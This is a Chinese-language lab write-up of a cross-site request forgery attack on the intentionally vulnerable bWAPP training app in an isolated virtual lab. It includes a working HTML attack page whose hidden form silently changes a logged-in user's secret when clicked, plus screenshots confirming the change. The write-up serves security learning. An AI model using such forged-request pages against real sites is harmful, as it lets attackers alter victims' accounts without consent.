实验环境：

Win7-1(10.10.10.135)：模拟用户机

Win7-2(10.10.10.137)+bWAPP：模拟被攻击服务器

kali(10.10.10.139)：模拟攻击机



实验过程：

用户机登录服务器bWAPP：

![](https://s2.loli.net/2022/03/22/iYgtlWS4K7LbDPQ.png)

攻击者构造攻击页面，并部署在攻击机上：

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>无标题文档</title>
<script type="text/javascript">
    function attack()
    {
        document.getElementById("transfer").submit(); 
    }
</script>
</head>

<body >
<h4 onclick="attack()">click me</h4>
    <form method="POST" id="transfer" action="http://10.10.10.137/bWAPP/csrf_3.php">
        <input type="hidden" name="secret" value="hack">
        <input type="hidden" name="login" value="bee">
        <input type='hidden' name="action" value="Change">
    </form>
</body>
</html>

```

上述代码的作用是诱使用户点击“click me”，自动跳转到修改密码的页面并自动提交新密码

攻击页面的URL为：http://10.10.10.139/test.html

用户机上访问该URL：

![](https://s2.loli.net/2022/03/22/jHLJ9yUqFru4nKm.png)

可以成功访问

首先用户成功登录bWAPP，让浏览器记录用户的Cookie

在让用户访问http://10.10.10.139/test.html

并点击“click me”

跳转到如下页面：

![](https://s2.loli.net/2022/03/22/wFIn2Bihl7Typgs.png)

表示已经修改成功了

我们查看服务器的数据库：

![](https://s2.loli.net/2022/03/22/ljGwVEC43z6ZeJb.png)

已经修改成功！！



在有些情况下，用户机点击攻击者构造的链接会自动跳转到如下界面，面跳转错误，经过反复排查后，发现清理了浏览器的数据后，又能够正常跳转了，可能是浏览器自动保存的某些数据让其产生了自动跳转。

![](https://s2.loli.net/2022/03/22/RwbDkqrFg8x7jpW.png)